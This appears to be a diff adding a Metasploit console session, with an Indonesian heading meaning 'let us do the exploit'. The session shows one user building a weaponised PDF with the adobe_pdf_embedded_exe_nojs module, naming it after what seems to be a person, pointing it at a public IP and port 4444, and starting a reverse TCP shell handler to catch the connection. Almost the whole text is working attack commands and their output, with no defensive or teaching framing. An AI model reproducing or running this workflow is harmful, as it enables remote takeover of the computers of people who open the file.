@@ -1,0 +1,30 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs
+
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > set LHOST 140.213.15.26
+LHOST => 140.213.15.26
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > set filename faris.pdf
+filename => faris.pdf
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > exploit
+
+[*] Making PDF
+[*] Creating 'faris.pdf' file...
+[+] faris.pdf stored at /Users/macair/.msf4/local/faris.pdf
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > mv /Users/macair/.msf4/local/faris.pdf /Users/macair/Desktop/
+[*] exec: mv /Users/macair/.msf4/local/faris.pdf /Users/macair/Desktop/
+
+MARI KITA LAKUKAN EXPLOIT :
+
+msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe_nojs) > use exploit/multi/handler/
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 140.213.15.26
+LHOST => 140.213.15.26
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+
+[-] Handler failed to bind to 140.213.15.26:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+
+
